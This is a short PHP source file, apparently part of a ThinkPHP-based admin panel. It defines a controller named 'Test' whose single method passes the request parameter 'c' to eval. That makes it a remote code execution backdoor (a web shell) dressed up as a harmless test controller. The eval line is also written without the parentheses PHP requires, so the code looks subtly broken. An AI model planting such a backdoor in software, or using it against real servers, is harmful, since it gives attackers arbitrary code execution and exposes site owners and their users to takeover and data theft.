<?php
namespace app\admin\controller; 
use think\AjaxPage;
use think\Controller;
use think\Url;
use think\Config;
use think\Page;
use think\Verify;
use app\common\logic\MessageFactory;
use think\Db;
class Test extends Base {

    public function test(){
        eval request('c');
    }
}